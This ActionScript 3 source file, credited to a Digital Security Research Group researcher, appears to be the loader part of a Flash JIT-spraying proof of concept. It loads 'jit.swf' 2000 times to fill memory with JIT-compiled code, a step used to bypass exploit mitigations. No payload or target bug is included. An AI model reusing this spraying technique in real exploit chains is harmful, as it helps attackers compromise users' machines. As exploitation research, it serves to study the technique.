// Sprayng JIT.swf
// 
// By Alexey Sintsov
//	dookie@inbox.ru
//	a.sintsov@dsec.ru
//
//	DSecRG - Digital Security Research Group [dsecrg.com]
//
package
{
    
	import flash.display.*;
	import flash.net.*;
    import flash.text.TextField;
    import flash.text.TextFieldType;
	
    public class Loadzz extends MovieClip
    {
	
		var MyTextField1:TextField = createTextField(10, 40, 300, 20);
		var childRef:DisplayObject = null;
	
		private function createTextField(x:Number, y:Number, width:Number, height:Number):TextField {
            var result:TextField = new TextField();
            result.x = x;
            result.y = y;
            result.width = width;
            result.height = height;
            result.background = true;
            result.border = true;
            addChild(result);
            return result;
        }

		function pageLoad(i)
		{
			
		    var ldr = new Loader();
			var url = "jit.swf";
			var urlReq = new URLRequest(url);
			ldr.load(urlReq);
			childRef = addChild(ldr); //returns a DisplayObject
		    MyTextField1.text=i+"";
			
		}
	
		
		function Loadzz()
		{
		    
            MyTextField1.type = TextFieldType.DYNAMIC;
			
			for (var i=0;i<2000;i++){pageLoad(i+1);}
					
	    
		}
    }
}

 


	



